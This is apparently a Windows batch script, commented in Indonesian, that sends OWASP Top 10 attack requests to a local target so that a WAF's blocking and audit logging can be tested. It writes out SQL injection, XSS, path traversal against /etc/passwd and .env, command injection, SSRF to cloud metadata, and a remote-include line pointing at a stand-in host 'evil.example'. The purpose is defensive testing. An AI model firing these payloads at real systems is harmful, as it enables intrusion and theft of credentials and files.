@echo off
REM Top 10 OWASP Attacks Seed Data Generator for Windows
REM Tujuan: Generate log real-time untuk testing WAF + LLM executive summary
REM Target: Asset Anda yang berjalan di http://127.0.0.1 (atau sesuaikan BASE_URL)

setlocal enabledelayedexpansion

set "BASE_URL=%BASE_URL:http://127.0.0.1=http://127.0.0.1%"

echo === OWASP TOP 10 ATTACK GENERATOR ===
echo Target: %BASE_URL%
echo Log file: C:\temp\waf_audit.log
echo Started at: %date% %time%
echo.

REM ============================================
REM 0) PRE-CHECK
REM ============================================
echo === PRE-CHECK ===
curl -sS -o nul -w "health: %%{http_code}^n" "%BASE_URL%/api/health" 2>nul

REM ============================================
REM 1) A01:2021 - BROKEN ACCESS CONTROL
REM ============================================
echo.
echo === 1) A01: BROKEN ACCESS CONTROL ===

curl -sS -o nul -w "%%{http_code} | IDOR: /api/users/1^n" "%BASE_URL%/api/users/1"
curl -sS -o nul -w "%%{http_code} | IDOR: /api/users/2^n" "%BASE_URL%/api/users/2"
curl -sS -o nul -w "%%{http_code} | IDOR: /admin/users^n" "%BASE_URL%/admin/users"
curl -sS -o nul -w "%%{http_code} | Unauthorized: /admin/config^n" "%BASE_URL%/admin/config"
curl -sS -o nul -w "%%{http_code} | Unauthorized: /api/settings^n" "%BASE_URL%/api/settings"

REM ============================================
REM 2) A02:2021 - CRYPTOGRAPHIC FAILURES
REM ============================================
echo.
echo === 2) A02: CRYPTOGRAPHIC FAILURES ===

curl -sS -o nul -w "%%{http_code} | Weak SSL: /legacy^n" "%BASE_URL%/legacy"
curl -sS -o nul -w "%%{http_code} | No HSTS: GET /api/data^n" "%BASE_URL%/api/data"

REM ============================================
REM 3) A03:2021 - INJECTION (SQLi)
REM ============================================
echo.
echo === 3) A03: INJECTION (SQLi) ===

curl -sS -o nul -w "%%{http_code} | SQLi GET: /?id=1'^n" "%BASE_URL%/?id=1'%20OR%20'1'='1--"
curl -sS -o nul -w "%%{http_code} | SQLi GET: /?user=admin'^n" "%BASE_URL%/?user=admin'%20UNION%20SELECT%201,2,3--"
curl -sS -o nul -w "%%{http_code} | SQLi GET: /?id=1; WAITFOR^n" "%BASE_URL%/?id=1;%20WAITFOR%20DELAY%20'0:0:5'--"

curl -sS -o nul -w "%%{http_code} | SQLi POST: username=admin'^n" -X POST "%BASE_URL%/" -H "Content-Type: application/x-www-form-urlencoded" --data "username=admin'%20OR%201=1--&password=test"

curl -sS -o nul -w "%%{http_code} | SQLi POST JSON^n" -X POST "%BASE_URL%/api/search" -H "Content-Type: application/json" --data "{\"query\":\"admin' OR '1'='1\"}"

REM ============================================
REM 4) A04:2021 - INSECURE DESIGN
REM ============================================
echo.
echo === 4) A04: INSECURE DESIGN ===

curl -sS -o nul -w "%%{http_code} | Insecure: /debug/vars^n" "%BASE_URL%/debug/vars"
curl -sS -o nul -w "%%{http_code} | Insecure: /_debug^n" "%BASE_URL%/_debug"
curl -sS -o nul -w "%%{http_code} | Insecure: /test?callback=alert(1)^n" "%BASE_URL%/test?callback=alert(1)"

REM ============================================
REM 5) A05:2021 - SECURITY MISCONFIGURATION
REM ============================================
echo.
echo === 5) A05: SECURITY MISCONFIGURATION ===

curl -sS -o nul -w "%%{http_code} | Config: /?file=../config^n" "%BASE_URL%/?file=../config/database.yml"
curl -sS -o nul -w "%%{http_code} | Config: /?file=../../.env^n" "%BASE_URL%/?file=../../.env"
curl -sS -o nul -w "%%{http_code} | Config: /?file=../../../etc/passwd^n" "%BASE_URL%/?file=../../../etc/passwd"

curl -sS -o nul -w "%%{http_code} | Exposed: /.git/config^n" "%BASE_URL%/.git/config"
curl -sS -o nul -w "%%{http_code} | Exposed: /phpinfo.php^n" "%BASE_URL%/phpinfo.php"
curl -sS -o nul -w "%%{http_code} | Exposed: /server-status^n" "%BASE_URL%/server-status"

REM ============================================
REM 6) A06:2021 - VULNERABLE COMPONENTS
REM ============================================
echo.
echo === 6) A06: VULNERABLE COMPONENTS ===

curl -sS -o nul -w "%%{http_code} | CVE: /cgi-bin/test.cgi^n" "%BASE_URL%/cgi-bin/test.cgi"
curl -sS -o nul -w "%%{http_code} | CVE: /xmlrpc.php^n" "%BASE_URL%/xmlrpc.php"
curl -sS -o nul -w "%%{http_code} | CVE: /.svn/entries^n" "%BASE_URL%/.svn/entries"

REM ============================================
REM 7) A07:2021 - AUTHENTICATION FAILURES
REM ============================================
echo.
echo === 7) A07: AUTHENTICATION FAILURES ===

curl -sS -o nul -w "%%{http_code} | Auth: /login?user=admin'^n" "%BASE_URL%/login?user=admin'%20OR%20'admin'%20OR%20'a'='a"
curl -sS -o nul -w "%%{http_code} | Auth: /?password=123456^n" "%BASE_URL%/?password=123456"
curl -sS -o nul -w "%%{http_code} | Default: /admin?user=admin&password=admin^n" "%BASE_URL%/admin?user=admin&password=admin"

REM ============================================
REM 8) A08:2021 - SOFTWARE INTEGRITY FAILURES
REM ============================================
echo.
echo === 8) A08: SOFTWARE INTEGRITY FAILURES ===

curl -sS -o nul -w "%%{http_code} | Integrity: /update?version=1.0.0'^n" "%BASE_URL%/update?version=1.0.0'%20OR%201=1--"
curl -sS -o nul -w "%%{http_code} | Integrity: /api/checksum?file=../../../etc/passwd^n" "%BASE_URL%/api/checksum?file=../../../etc/passwd"

REM ============================================
REM 9) A09:2021 - SECURITY LOGIC ERRORS
REM ============================================
echo.
echo === 9) A09: SECURITY LOGIC ERRORS ===

curl -sS -o nul -w "%%{http_code} | Logic: /api/transfer?from=admin&to=user&amount=0^n" "%BASE_URL%/api/transfer?from=admin&to=user&amount=0"
curl -sS -o nul -w "%%{http_code} | Logic: /api/purchase?discount=100%^n" "%BASE_URL%/api/purchase?discount=100%"

REM ============================================
REM 10) A10:2021 - SERVER-SIDE REQUEST FORGERY
REM ============================================
echo.
echo === 10) A10: SERVER-SIDE REQUEST FORGERY ===

curl -sS -o nul -w "%%{http_code} | SSRF: /?url=http://169.254.169.254^n" "%BASE_URL%/?url=http://169.254.169.254/latest/meta-data/"
curl -sS -o nul -w "%%{http_code} | SSRF: /?url=file:///etc/passwd^n" "%BASE_URL%/?url=file:///etc/passwd"
curl -sS -o nul -w "%%{http_code} | SSRF: /?url=http://localhost:22/^n" "%BASE_URL%/?url=http://localhost:22/"

REM ============================================
REM BONUS: XSS
REM ============================================
echo.
echo === BONUS: XSS ATTACKS ===

curl -sS -o nul -w "%%{http_code} | XSS: /?search=<script>alert(1)</script>^n" "%BASE_URL%/?search=<script>alert(1)</script>"
curl -sS -o nul -w "%%{http_code} | XSS: /?x=<img src=x onerror=alert(1)>^n" "%BASE_URL%/?x=<img%20src=x%20onerror=alert(1)>"
curl -sS -o nul -w "%%{http_code} | XSS: /?msg=<svg/onload=alert(document.domain)>^n" "%BASE_URL%/?msg=<svg/onload=alert(document.domain)>"

REM ============================================
REM BONUS: PATH TRAVERSAL
REM ============================================
echo.
echo === BONUS: PATH TRAVERSAL ===

curl -sS -o nul -w "%%{http_code} | LFI: /?file=../../../../etc/passwd^n" "%BASE_URL%/?file=../../../../etc/passwd"
curl -sS -o nul -w "%%{http_code} | LFI: /?page=..%2F..%2F..%2F..%2Fetc%2Fshadow^n" "%BASE_URL%/?page=..%2F..%2F..%2F..%2Fetc%2Fshadow"

REM ============================================
REM BONUS: COMMAND INJECTION
REM ============================================
echo.
echo === BONUS: COMMAND INJECTION ===

curl -sS -o nul -w "%%{http_code} | CMD: /?cmd=;cat /etc/passwd^n" "%BASE_URL%/?cmd=;cat%20/etc/passwd"
curl -sS -o nul -w "%%{http_code} | CMD: /?cmd=||id^n" "%BASE_URL%/?cmd=%7C%7Cid"

REM ============================================
REM BONUS: RFI
REM ============================================
echo.
echo === BONUS: RFI ===

curl -sS -o nul -w "%%{http_code} | RFI: /?include=http://evil.example/shell.txt^n" "%BASE_URL%/?include=http://evil.example/shell.txt"
curl -sS -o nul -w "%%{http_code} | RFI: /?load=https://example.com/payload.php^n" "%BASE_URL%/?load=https://example.com/payload.php"

echo.
echo === SELESAI ===
echo Jika WAF aktif, banyak request di atas akan return 403 dan tercatat di audit.log
echo Lihat log: type C:\temp\waf_audit.log

endlocal